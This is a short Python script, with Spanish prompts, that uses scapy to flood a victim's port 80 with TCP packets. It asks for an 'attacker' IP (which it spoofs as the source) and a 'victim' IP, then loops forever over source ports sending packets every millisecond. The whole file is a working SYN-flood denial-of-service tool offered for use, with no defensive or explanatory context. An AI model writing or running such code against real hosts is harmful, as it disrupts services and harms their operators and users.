#!/usr/bin/env python

from scapy.all import *
src = raw_input('ingresa la ip del atacante:')
target = raw_input('ingresa la ip de la victima: ')
numeropaquete=1
while True:
	for srcport in range (1,65535):
	 IP1 = IP(src=src, dst=target)
	 TCP1 = TCP(sport=srcport, dport=80)
	 pkt = IP1 / TCP1
	 send(pkt,inter= .001)
	 print 'paquete enviado', numeropaquete
	 numeropaquete=numeropaquete+1
